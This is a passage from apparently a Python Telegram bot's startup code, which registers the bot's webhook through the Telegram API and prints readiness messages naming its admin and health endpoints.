            r = requests.get(f"{TELEGRAM_API}/setWebhook?url={wh}", timeout=10).json()
            print("✅ Webhook set:", r.get("description", "OK"))
        except Exception as e:
            print("⚠️ Webhook auto-set failed:", e)
    else:
        print("⚠️ Visit /set_webhook after deploy.")
    print("🤖 Bot ready | Admin: /admin | Health: /health")
